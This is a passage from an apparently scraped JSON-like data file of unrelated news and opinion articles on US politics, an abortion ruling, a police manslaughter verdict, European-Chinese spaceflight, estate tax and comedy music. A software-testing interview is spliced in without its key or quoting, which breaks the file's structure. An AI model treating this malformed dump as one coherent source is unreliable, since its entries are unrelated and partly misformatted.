a series of consultations between the HEA and the State’s universities, institutes of technology and other third-level colleges.\n\nFuture plans\n\nIn a move some believe may affect academic independence, the HEA will have the power to withhold up to 10 per cent of funding if institutions fail to meet their targets.\n\nThe headline figures in the report showed higher education was competing “very well internationally” and graduate employment had bounced back to pre-crisis levels.\n\nMr Quinn said the report provided a “good news story” and he praised the institutions for delivering “extraordinary productivity” at a difficult time.\n\nHowever, “those kinds of productivity gains have a certain limit and I think we are probably getting close to what that limit might be”.\n\nAmong the major findings of the report were: l n Half of 30- to 34-year-olds\n\nhave third-level qualifications, the highest level in Europe; l n Irish universities are in the top 1 per cent of research institutions in the world across 18 academic disciplines; l n 75 per cent of Irish employers are satisfied with graduate skills.\n\nThe report can be accessed at education.ie and the HEA/ institution compacts at hea.ie.",
  "latent_28492": "As Norma Munroe lay dying in a Florida hospice bed, her body weakened by a four-year battle with lung cancer and her faculties dulled by dementia, visitors who walked into her dimly lit room could count on two things.\n\nOne was that Allan Munroe, her husband of more than sixty years, would be seated next to the bed in a wooden chair, holding her hand in his. The other was that Allan's eyes would be intently glued to a TV screen if his beloved Boston Red Sox were playing, counterbalancing the room's grim immediacy with the steady routine of balls and strikes, outs and base hits.\n\nThe Red Sox have helped 87-year-old Allan these past few years by \"being an escape from a reality that hasn't always been so great,\" says his granddaughter Angela McKinnon.\n\nNorma died this May, creating a void that baseball — even Red Sox baseball — can only do so much to fill.\n\n\"It was a horrible thing to watch as far as anyone you love being in a hospice and going through that whole long process,\" McKinnon tells Mashable. \"Grandpa was married to her for so long and you could just tell he was lost.\"\n\nA couple years ago, midway through Norma's battle with cancer, McKinnon and other family members pooled their money to buy Allan a commemorative brick at Boston's legendary home field, Fenway Park.\n\n\"Allan Munroe has 2 tru loves,\" it reads. \"Norma and the Sox.\"\n\nAllan hasn't seen his brick, though. At least not yet. The Massachusetts native hasn't been to Fenway in 50 years. He went to games there as a young man, but life has since gotten in the way. He was in the Air Force, an occupation that took him all over the world. Then he and Norma moved to Florida, where they raised four kids and he enjoyed a long career with the Brevard County Sheriff's Department. He made it to a few games in Tampa when the Sox played there, and rarely missed a game via TV or radio, but never made it back to Fenway.\n\nHe's also got health issues of his own. He recently got out of a rehab center after breaking his hip, has heart problems and McKinnon says dementia is just beginning to set in.\n\nBut Allan Munroe has a final dream before it's all said and done. He wants to see his Red Sox play in Boston one last time.\n\nBetween other family members' health issues and the costs of education and child-rearing, however, McKinnon says the family doesn't have enough money to fund the trip on its own. So they've turned to the crowd-funding site GoFundMe.com to try to get Allan back to Fenway and help him with the aftermath of Norma's death.\n\nAllan gets tired early, so a day game would be best. With just a month left in the season and other family members' work schedules, that leaves one ideal target date: Sept. 14, a Saturday, when the loathed New York Yankees pay a visit. Three days prior, Sept. 11, will mark what would have been Allan and Norma's 64th wedding anniversary, the first since she died.\n\nSince McKinnon started the campaign on July 22, it's raised just over $1,500—$1,000 of that from one anonymous donor. She hopes to reach a grand total of $5,000 to pay for lodging and rent a large vehicle Allan can travel comfortably in along with herself, her husband and her mother and aunt, who have spent the past few years as caregivers for Allan and Norma. Even so, with the money raised so far, McKinnon says \"we're still gonna try to make this happen even if just one person takes him and they eat peanut butter and jelly the whole time.\"\n\nShe says Allan is only \"vaguely\" aware of the online effort, but that a visit to Fenway would be a poignant moment for both him and the family after some difficult years and a lifetime of service to his kids and grandkids.\n\n\"He would never give up on something he knew would make us happy,\" McKinnon writes on the GoFundMe page, \"and we will not give up on making his dream become a reality.\"\n\nFor more information, you can visit the GoFundMe page here.\n\nUpdate: Allan Munroe's story reached a happy ending.\n\nImages: Jared Wickerham/Getty Images; courtesy Angela McKinnon",
  "latent_28577": "Bernie Sanders speaks to Chuck Todd (NBC/screen grab)\n\nNBC host Chuck Todd speculated over the weekend that he may have conducted his last interview with Bernie Sanders as a presidential candidate.\n\nIn an interview that aired on Sunday’s edition of Meet the Press, Sanders admitted that he had a narrow path to defeating former Secretary of State Hillary Clinton.\n\n“At the end of the day, you feel like you were giving a fair shot to this nomination?” Todd wondered.\n\n“Yeah,” Sanders replied. “We took advantage the opportunities in front of us. We are in this race, we are not writing our obituary. We are in this race to California, and we’re proud of the campaign we ran.”\n\nThe NBC host pointed out that 16 of the 17 states with the highest levels of income inequality had voted for Clinton in primaries even though it had been the top issue for Sanders’ campaign.\n\n“Because poor people don’t vote,” Sanders lamented. “I mean, that’s just a fact. That’s the sad reality of American society.”\n\n“[If] Donald Trump is the nominee, do you have a responsibility to do what it takes to get your voters to support Hillary Clinton?” Todd asked.\n\n“I will do everything that I can to make certain that Donald Trump is not elected president,” Sanders insisted. “But if that scenario plays out, the major responsibility will be on Secretary Clinton to convince all people — not just my supporters — that she is the kind of president this country needs to represent working people in this country, to take on the big money interests who have so much power.”\n\n“I think she’s going to have to be very explicit about supporting a program that stands up for the needs of the middle class and working families,” the Vermont senator added. “Which most importantly makes it clear that she is prepared to take on Wall Street in a very clear way, take on the billionaire class, come up for a program that makes health care for all in this country a right within the next several years.”\n\nSanders conciliatory comments left Todd wondering if he had mentally conceded the race.\n\n“Did we just hear, intentionally or not, the Bernie Sanders exit interview?” Todd concluded.\n\nWatch the video below from NBC’s Meet the Press, broadcast April 24, 2016.",
  "latent_28599": "The Oklahoma Supreme Court struck down one of the state’s abortion restrictions on Tuesday, landing yet another blow against laws that require abortion providers to obtain admitting privileges at nearby hospitals.\n\nAdvertisement\n\nIn his opinion, Justice Joseph Watt wrote that the Oklahoma state legislature passed the law under the pretext of protecting women’s health, a claim he called a “guise.” He wrote that the law, which required every abortion performed in the state to be accompanied by a doctor with admitting privileges at a hospital within 30 miles, constituted an “undue burden” on abortion access.\n\nThe restriction violated both the Oklahoma and U.S. constitutions, the court unanimously decided, referencing the U.S. Supreme Court’s June decision against a similar Texas law in Whole Woman’s Health v. Hellerstedt. Watt’s argument echoes Justice Stephen Breyer’s opinion in Whole Woman’s Health. Breyer wrote that that there is no actual public health crisis around abortion for right-wing legislators to solve and that laws that erect barriers between women and health care are harmful, not helpful. Since hospitals are already required to admit any patient in danger regardless of her doctor’s admitting privileges, and since abortions are far safer than other outpatient procedures (a patient is 40 times more likely to die from a colonoscopy), these laws protect no one while causing clinics to close.\n\nThe Center for Reproductive Rights was behind the challenge to Oklahoma’s admitting privileges law, which Oklahoma Gov. Mary Fallin signed in 2014. Courts have since prevented it from taking effect. CRR brought the lawsuit on behalf of a physician who provides almost half of all Oklahoma’s abortions and was turned down when he tried to get admitting privileges at hospitals near Oklahoma City.\n\nEarlier this year, the U.S. Supreme Court halted a law in Louisiana that forced similar admitting privileges requirements on abortion providers. A coalition of reproductive-rights groups filed a lawsuit in November against another such restriction in Missouri that, along with a law that required abortion providers to retrofit their clinics to the specifications of a surgical theater, has left the state with just one abortion provider.\n\nAdvertisement",

  "latent_29588": "WASHINGTON ― GOP presidential nominee Donald Trump joins a roster of famous movie bullies in a new Hillary Clinton attack ad that draws from “A Christmas Story,” “The Karate Kid” and “Back to the Future.”\n\nThe latter film is an especially good choice because, as The Huffington Post reported last year, “Back to the Future” bully Biff Tannen was inspired partly by Trump in the first place.\n\nThere are a lot of bullies in this world. The last thing we need is one in the White House. pic.twitter.com/M0owOglPjy — Hillary Clinton (@HillaryClinton) October 17, 2016\n\nThe Clinton campaign sadly did not use a clip that showcases the Trump-Biff connection, however. The ad takes a clip from the first “Back to the Future” film with a young Biff slapping George McFly in a 1950s diner.\n\n“Back to the Future Part II” depicts blond Biff as a rich casino magnate on his third wife in a dystopian 1985. Screenwriter Bob Gale confirmed that rich Biff had been based on Trump in an interview with The Daily Beast last year.\n\n“You watch Part II again and there’s a scene where Marty confronts Biff in his office and there’s a huge portrait of Biff on the wall behind Biff,” Gale said, “and there’s one moment where Biff kind of stands up and he takes exactly the same pose as the portrait? Yeah.”\n\nThe fictional town of Hill Valley ruled by rich Biff in that film is a crime-ridden hellhole ― oddly similar to how Trump describes inner cities today.\n\nHUFFPOST READERS: What’s happening in your state or district?

Rikard enjoys the dynamics between people/machines, objective/subjective and whole/details.\n\nRikard Edgren Rikard Edgren\n\nPersonal Background\n\nHexawise: What drew you into a career in software testing?\n\nRikard: Like most people it happened by accident; I wanted to become a programmer, but had a chance to start at a company with testing as a stepping stone.\n\nI realized I liked testing and was good at it, and wasn't upset that I never got the chance to be \"promoted\" to developer, and just went with it by doing a lot of testing.\n\nI did a couple of years as project manager (good insights for a tester), but went back to what I enjoyed most.\n\nI think I love testing because of the dynamics between the technical and the humanistic; the details and the whole; the objective and subjective.\n\nAnd of course the thrill of being first to see a nasty problem!\n\nHexawise: You share authorship of the thoughts from the test eye blog with a few of your former colleagues. This joint author setup is fairly rare; what advantages do you see from this arrangement?\n\nRikard: Henrik Emilsson and Martin Jansson tricked me into this in 2008. In the beginning it was great to have two readers!\n\nWe also commented on each others posts, which made us learn more. We also did some joint efforts, e.g. a list of generic Software Quality Characteristics.\n\nIt is a benefit that the blog keeps going also when one or two are very occupied with other things. It also gives a healthy pressure to provide to our common project. The activity is lower nowadays, but still alive.\n\nIt has kept the three of us more in touch even though we have worked at different places and locations.\n\nSo I see only positive aspects from the joint setup, and encourage writing as a learning process, with sharing as a good side-effect. Ideas you discuss, try, discuss, are typically better than ideas you work out by yourself.\n\nViews on Software Testing\n\nHexawise: In your book, The Little Black Book On Test Design, you write: \"You want to create tests that are testworthy, and typical examples can be those tests where you don’t know if it is important or not, but you want to make sure.\" How often do you see software developers providing guidance on testing focus due to concerns about the code? My background is in software development and often we know when certain aspects of the code have higher potential for bugs - often due to complexity or novelty. But in my experience this insight (that could focus software testing) is not provided as often as would be useful.\n\nRikard: In my experience I haven't received important information like this on direct questions. However, when I have worked together with the developers for some time, and (hopefully) have earned respect by digging up interesting information, this sort of guidance come more and more often. I hope it is because they realize that my testing can act on vague and disparate information, and that they value the findings and want more of it. It doesn't seem to be enough to say that you can test the software well, you have to actually do it first in order to gain a healthy respect that everyone benefit from.\n\nOnce the trust is there, communication is more open and better, and it is easier also for me to admit areas where the testing wasn't the best.\n\nRespect isn't given, it must be earned, and you do that by finding information others need, that they wouldn't have found by themselves.\n\nHexawise: Do you have any specific suggestions on how testers can gain respect from developers and encourage them to see a tester as someone to assist them in creating great software. Too often it seems software developers can view software testers as a bother rather than a help?\n\nRikard: Make sure you provide valuable information. Find bugs the developers want to fix. Give feedback on things that work well. Find bugs that other stakeholders want to fix. Listen to developers input on what needs testing. Collaborate. Be nice and do good work.\n\nHexawise: In your book you also mention the value of combinatorial testing to discover problems that don't appear in isolation but only with interaction between components of the software and different use cases. Do you have a favorite example of a combinatorial bug? How did that bug illuminate a challenge in software testing?\n\nRikard: I will never forget a dialog box that crashed when you clicked Cancel, but only if the dialog first had been moved. I don't think I would have come up with the idea of testing just this, it was something I stumbled on because I like to do things differently. It is still a mystery how someone managed to create this bug, and I don't know if it was important to fix it. This illuminates the challenge in software testing on which parameters to explicitly deal with, and which parameters to implicitly deal with by serendipity-enabling variations in our testing.\n\nHexawise: What is one thing you believe about software testing that many smart testers disagree with?\n\nRikard: I think many would disagree that it often is a good idea to run tests without no particular reason; that a random test can be better that one carefully picked; that using my subjectivity will help me test the product better.\n\nThese work (according to me) because testing is a sampling business, and we should have serendipity working for us.\n\nAlso, people have phenomenal capacity when motivated, so I would rather have you perform five tests you believe in, than one that I think is better.\n\nIndustry Observations / Industry Trends\n\nHexawise: Do you believe testing is becoming (or will become) more integrated with the software development process? And how do you see extending the view of the scope of testing to include all the way from understanding customer needs to reviewing actual customer experience to drive the testing efforts at an organization?\n\nRikard: I think testing have been integrated with the software development process for a long time, and I think good testing often needs to understand customer needs and actual experience. In my 19 years with testing this is how I have worked, unless there are circumstances that make it impossible.\n\nBut I have heard similar comments before, and I rather believe that there was some years where there were loud thoughts that testing must be totally objective, both in regards with who we work with, and with the sole objective to verify the documented requirements. Nowadays more people say that they look for more things than what was defined in advance, and that they collaborate with developers as much as possible. Testers have been doing this all the time, and it is a good thing that the idea of \"test documentation over insights\" is retiring.\n\nHexawise: What do you wish more developers, business analysts, and project managers understood about software testing?\n\nRikard: That it is difficult, but done well software testing provides a lot of value to any software where quality is important (but not every project needs testing!)\n\nThat they can influence us: tell us about what is important, and we will find out useful stuff about this (good and bad things.)\n\nThat automation is great, and exploratory testing too.\n\nStaying Current / Learning\n\nHexawise: How do you stay current on improvements in software testing practices; or how would you suggest testers stay current?\n\nRikard: I think each testing situation is unique, so I try to stay current by doing the most effective testing in my current situation. This might include old stuff, recent stuff, brand new stuff, or at least a combination of \"stuff\" that makes sense for me and the project at the moment. I try to do small experiments with new tools, and disregard most of them, but maybe learned something in the process. By going deeper into the current context, I learn a lot in that area, but maybe not about what is the latest in general.\n\nMany new ideas come right out of the blue when I do something else, so I think my subconscious is helpful to me.\n\nMy suggestion to testers would be to use whatever methods they think are fun (and valuable if it is work time), because that will keep up the motivation, and enhance the learning process.\n\nHexawise: Have you incorporated a new testing idea into your testing practices in the last year? Will you continue using it? Why? / Why not?\n\nRikard: I don't think I have incorporated any brand new testing idea the last year. But of course there are new combinations of old ideas for my specific purposes.\n\nRecently our team created a \"TimeBlaster\" in SoapUI; the results from a request is analyzed for time elements, and then many requests are sent with different start-end times (some of them randomized) whereupon the new responses are analyzed for conformance to the specification. Since these rules for time is somewhat complicated, this automation makes us (and other users of the same services) test better and faster, so we will continue using it.\n\nMy ongoing, low-frequency, private research currently deals with mental models; how I and other testers think, how we come up with new ideas, how we act on certain perspectives, but not on other. How we handle the complexity of software and human interaction and figure out what we should be testing with limited time available.\n\nBut I don't have any answers yet, at least in my head it is a multitude of (invisible) mental models that interact in mysterious, and productive, ways.\n\nHexawise: What software testing-related books would you recommend should be on a tester’s bookshelf?\n\nRikard: The best testing book for me is Lessons Learned in Software Testing, by Kaner, Bach, Pettichord. Another favorite is Exploring Requirements by Weinberg/Gause, which (secretly) is about \"test analysis\" - finding out what is important.\n\nThe most brilliant free article is Heuristic Test Strategy Model by James Bach, because it is generic for any software project, and the reader has to do all the hard work by themselves when using the structure it gives for attacking a test project.\n\nMy favorite blogger/youtuber is Alan Richardson.\n\nThere is lots of good stuff available on the net, and a lot of bad stuff as well, so a healthy dose of skepticism is needed.\n\nAnd to practice \"a healthy dose of skepticism\" is something we need to do as testers!\n\nProfile\n\nRikard Edgren has been a humanistic and technical tester since 1998.

  "latent_29735": "Congressional Republicans echoed Mr. Trump’s whoppers.\n\n“You actually create jobs by getting rid of this death tax,” said the House speaker, Paul Ryan. “Because you know what kills one family business from passing their business on to the next generation? The estate tax.”\n\n“For too long, this tax has threatened family-owned businesses — including women- and minority-owned businesses — from being passed down to their children and grandchildren,” said Representative Kevin Brady, chairman of the House Ways and Means Committee, which produced the tax legislation.\n\nWrong, wrong and wrong. So who actually does pay estate tax?\n\n1. The top 0.2 percent. Some 11,300 American estates — about 0.2 percent — are estimated to be subject to the estate tax this year. The top tenth of income earners pay nearly 90 percent of estate taxes collected, and about one fourth of that total is paid by the richest 0.1 percent. The tax itself has been whittled down significantly. Until 2001, it applied to inheritances starting at $650,000 for an individual. Today, an inheritance must be larger than $5.49 million for an individual or $10.98 million for a couple for their heirs to be liable for any estate tax at all. Opponents of the tax say it taxes earnings twice. But more than half of the biggest estates consist of unrealized capital gains — like stocks that have appreciated without being sold — that have never been previously taxed.\n\n2. A few dozen farmers, and even fewer minority business owners. About 80 family farmers or small-business people would be subject to the estate tax this year, according to an analysis by the nonpartisan Tax Policy Center — a far cry from the “millions” Mr. Trump wrongly claims. The biggest winners in an estate tax repeal wouldn’t be struggling ranchers, minority contractors or mom-and-pop grocers. They’d be people like Mr. Trump’s kids, unless they’re …\n\n3. Morons. “Only morons pay the estate tax,” Gary Cohn, Mr. Trump’s chief economic adviser, told Senate Democrats, meaning, it was later explained, “rich people with really bad tax planning.” Many of the very wealthy use loopholes, like trusts, to avoid paying inheritance tax. We don’t know where Mr. Trump’s kids would stand because Mr. Trump has never fulfilled his promise to publicly release his tax information.\n\nAn estate tax repeal would provide a tax windfall of more than $3 million apiece for the top 0.2 percent of earners, and more than $20 million for the wealthiest Americans. It would cost $239 billion in revenue over a decade. It offers nothing for middle-class people, except more evidence of Mr. Trump’s and Republicans’ bad faith.",
  "latent_29819": "A contingent of astronauts and instructors from the Paris-headquartered European Space Agency (ESA) recently found themselves attempting to navigate an alien frontier: the Beijing training base for taikonauts, China's new space explorers.\n\nJoining the week-long visit in January to the Astronaut Center of China were representatives of ESA's Human Spaceflight Directorate, along with a young European astronaut who is studying Chinese. Just weeks earlier, a group of Chinese taikonauts had visited the European Astronaut Center in Cologne.\n\nSome ESA higher-ups have been pushing for strengthened spaceflight ties with China, which launched its first manned capsule into orbit a decade ago. The January gathering in Beijing was just the latest in a whirlwind of high-level exchanges aimed at mulling and perhaps shaping a new European-Chinese space alliance.\n\nLast spring, after viewing the liftoff of an Ariane rocket bound for the International Space Station (ISS), one director of the Chinese space agency urged speeding up joint space endeavors. But the heads of its ever-expanding program have yet to issue a formal invitation for a European astronaut to join the crew on a mission using China's Shenzhou spacecraft.\n\nIn Europe, Thomas Reiter, the former space station astronaut who now leads ESA's Human Spaceflight Directorate, is spearheading the drive to forge closer ties with China. In early 2012, Reiter told SPIEGEL: \"Our goal is that, within the current decade, a Chinese spaceship will dock at the International Space Station or a European spaceship will dock at the Chinese space station.\"\n\nObstacles to Cooperation\n\nBut several obstacles stand in the way of Reiter's goals of European-Chinese space collaboration.\n\nFirst, any new space pact covering joint operations with Chinese astronauts will require approval by ESA's 20 member states.\n\nSecond, proposals to transform Europe's space freighter, the Automated Transfer Vehicle, into a capsule capable of transporting astronauts are still awaiting ESA approval. But Pål Hvistendahl, the ESA's head of media relations, says there are currently \"no plans ESA-side on our own crew capsule.\"\n\nThird, there is substantial resistance in the United States Congress to allowing China to become an ISS partner. \"Due to Chinese espionage in the aerospace industry, this remains a hot-button issue on Capitol Hill,\" says Clay Moltz, a professor at the Naval Postgraduate School, in Monterey, California, and author of the 2011 book \"Asia's Space Race.\"\n\nThe US has also been bombarded with a barrage of cyberattacks from China. With military-like precision, hackers have hit an array of American targets, including the email accounts of members of the US House of Representatives, Google's central servers, NASA's high-security database and major newspapers, including the New York Times and the Wall Street Journal.\n\nChinese membership in the space station, says Moltz, \"would require US consent, and it seems very unlikely to be forthcoming before at least 2020.\"\n\nBut even in the face of American opposition, at least technically, any ISS partner could use its allocation of astronaut slots to invite a single Chinese taikonaut, rather than an entire Shenzhou spacecraft, to visit the station. Russia might do this, Moltz predicts, \"in order to make a political statement.\"\n\nEfforts to get the Chinese to the globe-orbiting station could echo 1975's Apollo-Soyuz Test Project, when Cold War combatants Washington and Moscow crafted their first link-up in space. The event heralded the end of a nearly two-decade long space race between the two superpowers and ultimately paved the way for their joint construction of the ISS.\n\nReliance on Russia and China\n\nMeanwhile, in its 2011 report, NASA's Aerospace Safety Advisory Panel (ASAP) warned that \"there is a greater-than-30-percent chance that the ISS could sustain a (loss of mission) sometime during its projected operating life.\" Since August 2011, when the US mothballed its aging Space Shuttle fleet, NASA has relied solely on Roscosmos, its Russian counterpart, to transport American astronauts to the ISS. But a series of failures over the past two years has raised doubts about the reliability of the Russian launchers.\n\nIn December 2012, Scott Pace, the director of the Space Policy Institute at George Washington University, cited the report when speaking before Congress on NASA's strategic direction. Pace testified that ASAP \"believes that continued reliance on a single, foreign (launch) system could result in the temporary or permanent abandonment of ISS prior to its end-of-life, resulting in an unplanned, potentially uncontrolled deorbit significantly earlier than the 2020s.\"\n\nIn other words, following a worst-case chain reaction of missteps -- including, for example, a life-threatening accident, emergency evacuation and then failure to be able to rocket a rescue team up in time to save the station -- the ISS could plunge back to Earth like a giant missile.\n\nTo prevent such a catastrophe, scientists at the Paris-based International Academy of Astronautics (IAA) are urging ISS partners to approve contingency plans guaranteeing that there are at least two alternative launch systems available for getting humans to the ISS. Since Russia and China are now the only powers in a position to get astronauts into space, the group recommends that Beijing's Shenzhou spacecraft be retrofitted with American or European docking equipment for future ISS missions.\n\nIn its 2010 report entitled \"Future Human Spaceflight: The Need for International Cooperation,\" the academy also called on Europe to develop a spacecraft capable of taking humans into orbit and beyond, and recommended \"reciprocal access to the ISS and Chinese space stations for international cooperation.\"\n\nInternally, \"ESA has been discussing ... with its partners whether and how the ATV could become human-rated,\" and its possible role in averting an accidental destruction of the ISS, says IAA member and Italian rocket designer Claudio Bruno.\n\nBut Pace, who co-edited the report, cautioned that proposed Shenzhou missions to the ISS, jointly piloted by Chinese and American astronauts, would depend on improved political ties between the rival superpowers.\n\nA Change in Space Leadership\n\nWhile the heads of China's space program are screening elite cadets to deploy on a new mission to the Sky Palace-1 orbital spacelab in June, they are also finalizing plans to land a robotic explorer on the moon as well as to test a new Long March 5 rocket designed to transport the first taikonauts to the lunar surface.\n\n\"China is on track to become the world's leading space-faring nation,\" says Michael Griffin, who headed NASA between 2005 and 2009. \"They have some ground to make up, but today are in the No. 2 position, behind Russia, in the only metric that really counts: the capacity to conduct an independent human spaceflight program.\"\n\nChina's steady advances in sophisticated rocketry and human spaceflight have coincided with a series of retreats by NASA over the past four years.\n\nGriffin, a physicist and aerospace engineer by training, is widely regarded within the American space community as one of the agency's greatest leaders. This is primarily attributed to his former role as the chief architect of blueprints to create a human settlement on the moon starting in the 2020s.\n\nThese ambitious plans envisioned a powerful Ares V rocket, Orion capsule and Altair lunar lander to get Americans back on the moon, where they could establish a permanent human outpost. But the White House terminated the so-called Constellation program in 2010, roughly a year after Griffin had left NASA, citing budgetary reasons. Although Congress rallied to save the Orion spacecraft and to order the development of an alternative booster, America's entire human spaceflight program is severely underfunded and lacks an overarching vision.\n\nAs a result, says Griffin, the US hasn't just lost its ability to launch astronauts into space for the time being. It has also ceded its long-standing position as the world's leader in manned spaceflight to Russia and China.\n\nWith Beijing's space advances and NASA's retrenchments, Griffin adds that, if it wanted to, \"China could take the lead in developing a lunar base in the 2020s.\"\n\nWithin NASA, Griffin was also an early backer of proposals to send human explorers to Mars, which could even be inhabitable. But NASA's current disarray is making the prospect of seeing American astronauts land on the red planet seem ever more remote.\n\nEurope Forges Closer Ties with China\n\nIn contrast, two years ago, ESA joined forces with the Astronaut Center of China and Russia's Federal Space Agency to launch Mars500, a simulated mission that lasted 520 days and included a 30-day sortie on a virtual Martian surface.\n\nThe simulation tested the ability of a crew of six -- three Russian cosmonauts, two European astronauts and one Chinese taikonaut -- to withstand a long-duration flight with only sporadic radio contact with Earth and together complete a joint mission.\n\nThe Mars500 experiment \"will for sure help us in defining the best conditions for a successful human mission to Mars,\" says Jennifer Ngo-Anh, who headed the project and is based at the European Space Research and Technology Center in the coastal Dutch town of Noordwijk.\n\nNgo-Anh says that selecting a Mars500 crewmember from the Astronaut Center of China signaled that the ESA \"is very keen on collaborating with our Chinese colleagues.\"\n\nThis collaboration and desire for more raises one question: If Washington continues to resist spaceflight cooperation with Beijing, could Europe, Russia and China instead agree on their own joint mission to Mars with a mixed crew such as the one used in the Mars500 simulation?\n\n\"Without question, Russia, China and ESA could begin work on a joint program to mount the first expedition to Mars,\" says Griffin, who now sits on the board of Stratolaunch Systems, an Alabama-based start-up launched by Microsoft co-founder Paul Allen that aims to revolutionize space transportation.\n\n\"It will take awhile to develop and execute such a mission no matter who does it, but the overall technical capability of these societies, especially Europe, is such that they can easily do it if they want to,\" Griffin says. \"The question is one of societal will and commitment, not one of basic technical feasibility.\"",
  "latent_29964": "The most important paper at the Brookings Panel was probably Krueger et al on the long-term unemployed, which basically confirmed what we’re learning from a number of sources: it’s really hard to get employers to look at people who have been out of work for an extended period, so any sustained increase in long-term unemployment tends to become permanent.\n\nThe best way to avoid this outcome, then, is to avoid prolonged periods of high unemployment.\n\nSo let me make the obvious point, just in case anyone missed it: the “pivot” of 2010 — when all the Very Serious People decided that the danger from debt trumped any and all concern for job creation — was an utter disaster, economic and human. It was even a disaster in fiscal terms, because a permanently depressed economy will cost far more in revenue than was saved by slashing the deficit by a few percent of GDP in the short term.\n\nNow, you might think that this post should be titled The Mistake of 2010 — but that would only be appropriate if it were truly an honest error. It wasn’t. Some of the austerians were self-consciously exploiting deficit panic to promote a conservative agenda; some were slipping into deficit-scolding rather than dealing with our actual problems because it felt comfortable; some were just going along for the ride, saying what everyone else was saying. Hardly anyone in the deficit-scold camp engaged in hard thinking and careful assessment of the evidence.\n\nAnd millions of people will still be paying the price for that casual irresponsibility for many years to come.",

  "latent_30108": "Officer was patrolling Brooklyn public housing facility with his gun drawn when he says he accidentally fired, killing unarmed black man in darkened stairwell\n\nThe NYPD officer who shot and killed an unarmed man in a stairwell was convicted of manslaughter Thursday by a Kings County jury. The officer, 28-year-old Peter Liang, held his head in his hands as the foreman read back the charges. Liang was also found guilty of official misconduct in relation to the fatal shooting of Akai Gurley in November 2014.\n\nThe manslaughter charge carries up to 15 years in prison. Liang’s sentencing is set for 14 April. He was fired from the force after the ruling, an NYPD spokesman said.\n\nKings County district attorney Ken Thompson said the ruling demonstrated that “no matter where you live in Brooklyn, your life matters”.\n\nScott Rynecki, the attorney representing the Gurley family, said after the decision that “no one is here rejoicing at the fact that this officer was convicted ... but the message was sent ... that if a police officer does something wrong their actions will be held accountable and will be held accountable in a court of law”. Rynecki is representing the family in a civil suit.\n\nIn a statement Pat Lynch, the president of the Police Benevolent Association, said: “This bad verdict will have a chilling effect on police officers across the city because it criminalizes a tragic accident.”\n\nBefore coming to their decision, the jury re-listened to the 911 call placed by a resident in the building after the shooting and handled Liang’s service weapon, even taking turns pulling its trigger. The prosecution argued during the trial that NYPD weapons are modified by the department to be more difficult to fire than the same handgun off the shelf, and that this makes an accidental trigger pull extremely unlikely.\n\nDuring closing arguments Tuesday, prosecutor Joe Alexis held Liang’s service weapon in front of the jury and said a finger along the side of the gun would not slip off and “find its way to the trigger” accidentally. “Fear and panic cannot excuse recklessness, especially on the part of a highly trained police officer,” Alexis added.\n\nLiang’s defense attorney, Robert Brown, concluded his two-hour closing argument Monday by calling Gurley’s death “a terrible tragedy” and not a crime.\n\nThe charges stemmed from an incident on 20 November 2014 when Liang and his partner Shaun Landau were conducting a “vertical patrol” in a public housing building in the Brooklyn neighborhood of East New York. Liang entered a darkened stairwell with his weapon drawn and, according to his testimony Monday, he was startled by a noise and his gun “just went off”.\n\nThe bullet ricocheted off a wall and struck 28-year-old Gurley, who had just entered the stairwell, in the chest.\n\nThroughout the trial Liang’s defense repeatedly called such a strike “a million to one”, both due to the fact that the bullet bounced off a wall and the likelihood of someone walking in the stairwell at exactly that time. During his testimony Liang called it “rare” for people to be walking in the stairwells at night. The prosecution countered during cross-examination that the very reason vertical patrols are conducted is because people enter those stairwells.\n\nThe prosecution attempted to convince jurors that not only did Liang behave recklessly with his weapon, but that by failing to try and provide CPR to Gurley as he laid dying Liang violated his duty to serve and protect. Liang’s defense team argued that he was in shock after he realized his bullet had struck someone. “I was panicking so much, I couldn’t process it in my head,” Liang said Monday.\n\nGurley’s companion Melissa Butler ended up attempting the procedure, while a neighbor shouted instructions from emergency medical services.\n\nLiang estimated on the stand Monday that he had conducted hundreds of vertical patrols in his short career. Throughout his testimony he struggled to maintain his composure, frequently turning away from the courtroom audience.\n\nA first-generation Chinese American, Liang grew up in Chinatown and speaks Cantonese. Liang, who is married, joined the police academy after a stint as a TSA agent, and one of the assignments he requested upon graduation was the transit arm of the NYPD.\n\nInstead he was assigned as an impact officer in East New York, one of the highest crime neighborhoods in the city. The NYPD’s controversial Project Impact assigns rookie officers to foot patrol in higher crime precincts.\n\nGurley, whose family relocated to the US from St Thomas when he was a baby, landed in the neighborhood’s Louis Pink houses in 2010 when he moved in with girlfriend Kimberly Ballinger. The two were engaged when he died and have a daughter, Akaila, who is now three years old.\n\n“I thank the jury so much for coming back with a guilty verdict,” Ballinger said Thursday night, echoing the sentiments of Gurley’s mother Sylvia Palmer who thanked God and the District Attorney’s office for the outcome.\n\nThroughout the trial the courtroom audience was cleaved by race. On one side sat mostly black friends and family of Gurley; on the other side sat mostly Chinese American family and supporters of Liang. Some in the Chinese community, like Doug Lee, who founded the Greater New York Coalition to Support Officer Liang, felt that the officer’s indictment only came because of a climate of discontent with law enforcement. “Peter Liang was made a scapegoat for the association with Mike Brown and Eric Garner,” Lee said.\n\nThe Committee Against Anti-Asian Violence, which has been organizing around issues of police brutality and misconduct for more than 30 years, called this attitude “misguided”. Executive director Cathy Dang said police violence is a systemic issue and that “Peter Liang is a part of that system and needs to be held accountable”.",

  "latent_30606": "Bellwethers of the 21st century’s “alt-comedy” movement, Tim Heidecker and Eric Wareheim took innumerable cues from HBO’s short-lived comedy trip Mr. Show, the cult sketch show of Bob Odenkirk and David Cross that ran from ‘95 to ‘98. Their beloved Adult Swim series Tim & Eric Awesome Show, Great Job! plunged right into the chasm of deranged, absurd comedy that Bob & David had stumbled upon, but whose edge they only started to peep over.\n\nAside from sheer comedy technique, one of the major Mr. Show-ian cues Tim & Eric inherited was a knack for musical references. Manifestations of this knack include the virile, deep-fried hard rock of Pusswhip Banggang, the uncomfortable, nursery rhyme-ish tunes of Casey Tatum and the blood-stained, butt-crusted raps (“Bloody Nips” and “Wipe My Butt,” among others) from the show’s “Kid Break” segment. These and many others are compiled on the album Awesome Record, Great Songs!.\n\nBefore Awesome Show, and before their pre-Awesome Show animated series Tom Goes To The Mayor, Heidecker was tinkering with comedy and rock in his Masterpiece trio, while Wareheim was involved with more serious fare, playing bass and guitar in numerous bands within the ilk of underground Philly screamo, such as Ink & Dagger, I Am Heaven and The Science Of. Over the past few years, Wareheim has amounted a daunting resume as a music video director (his credits include Beach House, Flying Lotus, Major Lazer and other massive names); back in May, Heidecker released his solo album In Glendale, an homage to soft rock troubadours like Jackson Browne and Paul McCartney.\n\nFor over the past 15 years, the songs of Tim & Eric have been an ongoing exhibit of trenchant hilarity. Here are 